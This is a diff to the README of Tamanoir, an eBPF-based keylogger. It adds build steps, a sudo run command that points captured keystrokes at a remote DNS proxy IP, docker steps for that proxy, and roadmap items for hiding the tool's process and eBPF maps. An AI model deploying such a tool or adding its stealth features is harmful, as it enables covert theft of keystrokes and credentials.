@@ -1,7 +1,11 @@
 <div align="center">
-  <h1> Tamanoir </h1>
+  <h1> Tamanoir <br> A KeyLogger using eBPF 🐝 </h1>
   <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
-  <h2> A KeyLogger using eBPF </h2>
+  <p><small>
+    <i>
+      A large anteater of Central and South America, Myrmecophaga tridactyla
+    </i>
+  </small></p>
 </div>
 
 ## 💡Overview
@@ -12,51 +16,85 @@
 
 <br>
 
+## 🚀 Setup
+
+You need a Linux based OS.
+
+### ⚒️ Build from source
+
+To build from source, make sure you have:
+
+- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
+- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
+
+#### 1. Build ebpf program
+
+```
+cd tamanoir-ebpf
+cargo build --release
+```
+
+#### 2. Build user space program
+
+```
+cargo build --release
+```
+
+This will produce an executable file at `target/release/tamanoir` that you can copy to a directory in your `$PATH`
+
+### 📥 Binary release
+
+You can download the pre-built binaries from the [release page](https://github.com/pythops/tamanoir/releases)
+
+<br>
+
 ## 🪄 Usage
-
-### Dns Proxy
-
-Make sure you have:
-
-- `docker` installed.
-- [just](https://github.com/casey/just) installed.
-
-```
-just proxy
-```
 
 ### Tamanoir
 
-Before using `Tamanoir`, make sure you have:
-
-- A Linux based OS.
-- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
-- [just](https://github.com/casey/just) installed.
-- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
-
-1. Build `Tamanoir` from source
-
 ```
-just build
-```
-
-2. Run
-
-```
-just run <Locally configured DNS server IP> <DNS Proxy IP> <keyboard layout>
+RUST_LOG=info sudo -E tamanoir \
+              --proxy-ip <DNS proxy IP> \
+              --hijack-ip <locally configured DNS server IP> \
+              --layout <keyboard layout>
 ```
 
 for example:
 
 ```
-just run 8.8.8.8 192.168.1.75 0
+RUST_LOG=info sudo -E tamanoir \
+              --proxy-ip 192.168.1.75 \
+              --hijack-ip 8.8.8.8 \
+              --layout 0
 ```
 
-Currenly, there is only 2 supported keyboard layouts:
+Currenly, there are two supported keyboard layouts:
 
 `0` : qwerty (us)
 
 `1` : azerty (fr)
+
+<br>
+
+### DNS Proxy
+
+On a remote host, make sure you have [docker](https://docs.docker.com/engine/install/) installed.
+
+#### 1. Build proxy image
+
+```
+cd proxy
+docker build -t proxy .
+```
+
+#### 2. Run proxy
+
+> [!NOTE]
+> Make sure port 53 is available
+
+```
+docker run --rm -it -p 53:53/udp -e PAYLOAD_LEN=8 proxy
+```
 
 <br>
 
@@ -65,7 +103,7 @@ Currenly, there is only 2 supported keyboard layouts:
 - [ ] Automatic discovery of the configured local dns server
 - [ ] Automatic discovery of the keyboard layout
 - [ ] Rewrite the DNS proxy in Rust
-- [ ] Make the `Tamanoir` stealth (Hide ebpf maps, process pid ...)
+- [ ] Make `Tamanoir` stealth (hide used ebpf maps and programs, process pid ...)
 
 <br>
 
